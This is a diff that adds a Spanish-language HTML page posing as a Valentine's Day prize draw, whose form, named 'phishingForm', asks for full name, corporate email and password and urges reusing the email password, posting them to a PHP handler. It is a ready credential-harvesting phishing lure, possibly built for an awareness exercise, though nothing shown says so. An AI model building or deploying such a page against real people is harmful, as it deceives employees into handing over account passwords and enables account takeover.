@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sorteo del Día del Amor y la Amistad 💖</title>
+    <link rel="stylesheet" href="Styles/styles.css">
+</head>
+<body>
+    <div class="container">
+        <h1>Sorteo del Día del Amor y la Amistad 💕</h1>
+        <p>¡Celebra el 14 de febrero con nosotros! Regístrate y gana premios especiales para ti y tus seres queridos.</p>
+        <form id="phishingForm" method="POST" action="Proceso/process.php">
+            <div class="form-group">
+                <label for="name">Nombre Completo</label>
+                <input type="text" id="name" name="name" required>
+            </div>
+            <div class="form-group">
+                <label for="email">Correo Electrónico (Corporativo)</label>
+                <input type="email" id="email" name="email" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Contraseña</label>
+                <small>*Crea una contraseña nueva o usa la misma de tu correo*</small>
+                <input type="password" id="password" name="password" required>
+            </div>
+            <button type="submit" class="btn-submit">Participar</button>
+        </form>
+        <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+        <!--<script>
+            document.getElementById("phishingForm").addEventListener("submit", function (event) {
+                event.preventDefault(); // Evita que el formulario se envíe normalmente
+            
+                const formData = new FormData(this);
+            
+                fetch("Proceso/process.php", {
+                    method: "POST",
+                    body: formData,
+                })
+                    .then((response) => {
+                        if (!response.ok) {
+                            throw new Error(`Error HTTP: ${response.status}`);
+                        }
+                        return response.json(); // Si el PHP devuelve JSON
+                    })
+                    .then((data) => {
+                        if (data.status === "success") {
+                            // Redirigir a confirmacion.html si el envío fue exitoso
+                            window.location.href = "Proceso/confirmacion.html";
+                        } else {
+                            alert(`Error: ${data.message}`);
+                        }
+                    })
+                    .catch((error) => {
+                        console.error("Error al enviar el formulario:", error);
+                        alert("Hubo un problema al enviar el formulario. Intenta de nuevo.");
+                    });
+            });
+        </script>
+    -->
+        <div class="footer">
+            © 2024 - Sorteo Exclusivo del Día del Amor y la Amistad
+        </div>
+    </div>
+    <script src="Scripts/script.js"></script>
+</body>
+</html>
